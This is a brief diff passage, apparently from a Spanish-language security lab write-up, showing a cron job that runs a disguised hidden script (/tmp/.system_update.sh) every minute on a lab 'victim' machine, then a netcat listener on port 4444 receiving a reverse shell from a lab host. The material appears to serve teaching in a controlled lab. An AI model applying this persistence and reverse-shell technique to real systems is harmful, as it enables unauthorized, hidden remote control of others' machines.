@@ -14,3 +14,11 @@ esperare a que me responda, mientras en la sesion de root en la maquina victima 
 
 # Programamos que se ejecute CADA MINUTO
 (crontab -l 2>/dev/null; echo "* * * * * /tmp/.system_update.sh") | crontab -
+
+
+┌──(root㉿8314deb831e2)-[/]
+└─# nc -lvp 4444
+listening on [any] 4444 ...
+connect to [172.20.0.20] from maestro_defensa.labseguridad_red_ataque [172.20.0.10] 38306
+
+ya tengo conexion de la reverse shell
